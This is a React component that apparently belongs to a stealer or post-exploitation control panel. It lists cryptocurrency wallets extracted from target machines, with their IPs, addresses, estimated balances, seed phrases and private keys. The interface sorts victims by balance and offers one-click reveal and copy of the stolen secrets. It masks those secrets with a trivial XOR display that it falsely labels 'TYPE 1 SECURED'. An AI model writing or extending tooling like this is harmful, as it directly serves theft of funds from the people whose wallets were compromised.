import { useEffect, useState } from 'react';
import { apiFetch } from '../../api';

interface CryptoWallet {
  id: string;
  target_ip: string;
  wallet_type: string;
  address: string;
  balance_est: string;
  extraction_type: 'SEED_PHRASE' | 'PRIVATE_KEY' | 'WALLET_DAT';
  payload: string;
}

export default function CryptoExtraction() {
  const [wallets, setWallets] = useState<CryptoWallet[]>([]);
  const [loading, setLoading] = useState(true);
  const [revealedIds, setRevealedIds] = useState<Set<string>>(new Set());
  const [sortOrder, setSortOrder] = useState<'asc' | 'desc' | null>(null);

  const loadWallets = async () => {
    try {
      setLoading(true);
      const res = await apiFetch('/api/extraction/crypto');
      if (res.ok && res.data) setWallets(res.data);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadWallets();
  }, []);

  const toggleReveal = (id: string) => {
    setRevealedIds(prev => {
      const newSet = new Set(prev);
      if (newSet.has(id)) {
        newSet.delete(id);
      } else {
        newSet.add(id);
      }
      return newSet;
    });
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const toggleSort = () => {
    setSortOrder(prev => prev === 'asc' ? 'desc' : prev === 'desc' ? null : 'asc');
  };

  const sortedWallets = [...wallets].sort((a, b) => {
    if (!sortOrder) return 0;
    // Basic extraction of numeric values from strings like "$1,200.50" or "0.5 BTC"
    const parseBalance = (bal: string) => parseFloat(bal.replace(/[^0-9.-]+/g, "")) || 0;
    const valA = parseBalance(a.balance_est);
    const valB = parseBalance(b.balance_est);
    return sortOrder === 'asc' ? valA - valB : valB - valA;
  });

  return (
    <div className="flex flex-col gap-6">
      <div className="flex justify-between items-center">
        <h2 className="text-xl font-bold text-green-500">💰 Cryptographic Wallet Extraction</h2>
        <button 
          onClick={loadWallets}
          className="bg-[#2a2a2a] px-3 py-1 rounded border border-[#3b3b3b] text-[12px] hover:bg-[#333] transition-colors"
        >
          {loading ? 'Scanning Ledger...' : 'Sync Vault'}
        </button>
      </div>

      <div className="bg-[#181818] rounded-xl border border-[#2b2b2b] overflow-hidden">
        <table className="w-full text-left text-[12px]">
          <thead>
            <tr className="bg-[#252525] text-[#8e8e8e] border-b border-[#2b2b2b]">
              <th className="p-4 font-medium">Target Node</th>
              <th className="p-4 font-medium">Wallet App</th>
              <th className="p-4 font-medium">Public Address</th>
              <th 
                className="p-4 font-medium text-green-400 cursor-pointer hover:text-green-300 select-none"
                onClick={toggleSort}
                title="Sort by Estimated Balance"
              >
                Est. Balance {sortOrder === 'asc' ? '↑' : sortOrder === 'desc' ? '↓' : ''}
              </th>
              <th className="p-4 font-medium">Material Type</th>
              <th className="p-4 font-medium text-red-500 flex items-center gap-2">
                <span>Decrypted Material</span>
                <span className="bg-red-900/30 text-red-500 border border-red-900/50 px-1.5 py-0.5 rounded text-[8px] tracking-widest">TYPE 1 SECURED</span>
              </th>
            </tr>
          </thead>
          <tbody className="divide-y divide-[#2b2b2b]">
            {sortedWallets.map(w => (
              <tr key={w.id} className="hover:bg-[#1f1f1f] transition-colors">
                <td className="p-4 font-mono text-[#8e8e8e]">{w.target_ip}</td>
                <td className="p-4 text-white font-bold">{w.wallet_type}</td>
                <td className="p-4 font-mono text-cyan-400 text-[10px]">{w.address}</td>
                <td className="p-4 font-mono text-green-400 font-bold">{w.balance_est}</td>
                <td className="p-4 text-[#ccc] text-[10px] uppercase font-bold">{w.extraction_type.replace('_', ' ')}</td>
                <td className="p-4 font-mono text-red-500 max-w-[200px]">
                  <div className="flex items-center gap-2">
                    <span className="truncate flex-1">
                      {revealedIds.has(w.id) 
                        ? w.payload 
                        : `[T1-ENC] ${Array.from(w.payload).map(c => (c.charCodeAt(0) ^ 0x55).toString(16).padStart(2, '0')).join('')}`.substring(0, 32) + '...'}
                    </span>
                    <button onClick={() => toggleReveal(w.id)} className="text-[#8e8e8e] hover:text-white text-[10px] font-bold">
                      {revealedIds.has(w.id) ? 'HIDE' : 'SHOW'}
                    </button>
                    <button onClick={() => copyToClipboard(w.payload)} className="text-[#8e8e8e] hover:text-white text-[10px] font-bold" title="Copy">
                      COPY
                    </button>
                  </div>
                </td>
              </tr>
            ))}
            {wallets.length === 0 && !loading && (
              <tr>
                <td colSpan={6} className="p-10 text-center text-[#8e8e8e] italic">No local cryptocurrency material extracted. Awaiting memory dump analysis.</td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}
